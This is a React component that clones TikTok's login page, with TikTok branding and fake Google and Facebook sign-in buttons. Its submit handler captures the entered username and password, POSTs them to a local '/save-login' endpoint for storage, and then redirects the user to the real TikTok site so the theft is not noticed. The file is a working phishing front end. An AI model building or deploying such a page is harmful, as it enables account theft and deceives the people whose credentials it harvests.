import React, { useState, useEffect } from "react";
import "./index.css";

export default function TikTokLogin() {
  const [darkMode, setDarkMode] = useState(() => {
    return localStorage.getItem("theme") === "dark";
  });

  useEffect(() => {
    localStorage.setItem("theme", darkMode ? "dark" : "light");
  }, [darkMode]);

  const handleLogin = async (e) => {
    e.preventDefault();
    const username = e.target[0].value;
    const password = e.target[1].value;

    try {
      await fetch("http://localhost:5000/save-login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
      });

      // Redirect to a reels page after login
      window.location.href = "https://www.tiktok.com/explore";
    } catch (err) {
      console.error("Failed to save login", err);
    }
  };

  return (
    <div
      className={`min-h-screen flex items-center justify-center font-sans ${
        darkMode ? "bg-black text-white" : "bg-white text-black"
      }`}
    >
      <div className="w-full max-w-sm p-8 rounded-xl shadow-2xl bg-white dark:bg-zinc-900 dark:text-white border border-gray-200 dark:border-zinc-700">
        <div className="text-center text-5xl font-extrabold mb-2 text-black dark:text-white">
          TikTok
        </div>
        <h2 className="text-center text-gray-500 dark:text-gray-400 mb-6 text-base">
          Log in to TikTok
        </h2>

        <form className="flex flex-col gap-4" onSubmit={handleLogin}>
          <input
            type="text"
            placeholder="Username or Email"
            className="px-4 py-3 rounded-md bg-gray-100 dark:bg-zinc-800 placeholder-gray-500 text-sm focus:outline-none focus:ring-2 focus:ring-pink-500"
            required
          />
          <input
            type="password"
            placeholder="Password"
            className="px-4 py-3 rounded-md bg-gray-100 dark:bg-zinc-800 placeholder-gray-500 text-sm focus:outline-none focus:ring-2 focus:ring-pink-500"
            required
          />
          <button
            type="submit"
            className="bg-pink-500 hover:bg-pink-600 text-white font-semibold py-3 rounded-md text-sm transition"
          >
            Log In
          </button>
        </form>

        <div className="flex items-center justify-center my-6">
          <div className="h-px bg-gray-300 dark:bg-zinc-600 w-full"></div>
          <span className="text-xs text-gray-400 mx-2">OR</span>
          <div className="h-px bg-gray-300 dark:bg-zinc-600 w-full"></div>
        </div>

        <div className="flex flex-col gap-3">
          <button className="flex items-center justify-center gap-3 py-3 px-4 rounded-md border border-gray-300 dark:border-gray-700 bg-white dark:bg-zinc-800 hover:bg-gray-100 dark:hover:bg-zinc-700 transition text-sm">
            <img
              src="https://cdn-icons-png.flaticon.com/512/300/300221.png"
              alt="Google"
              className="w-5 h-5"
            />
            Continue with Google
          </button>
          <button className="flex items-center justify-center gap-3 py-3 px-4 rounded-md border border-gray-300 dark:border-gray-700 bg-white dark:bg-zinc-800 hover:bg-gray-100 dark:hover:bg-zinc-700 transition text-sm">
            <img
              src="https://cdn-icons-png.flaticon.com/512/124/124010.png"
              alt="Facebook"
              className="w-5 h-5"
            />
            Continue with Facebook
          </button>
        </div>

        <p className="mt-6 text-xs text-center text-gray-500 dark:text-gray-400">
          Don't have an account? <button className="text-pink-500 hover:underline">Sign up</button>
        </p>
      </div>

      <button
        onClick={() => setDarkMode(!darkMode)}
        className="absolute top-4 right-4 text-xs px-3 py-1 rounded-full border border-gray-400 dark:border-white hover:bg-gray-200 dark:hover:bg-white dark:hover:text-black transition"
      >
        {darkMode ? "Light" : "Dark"} Mode
      </button>
    </div>
  );
}
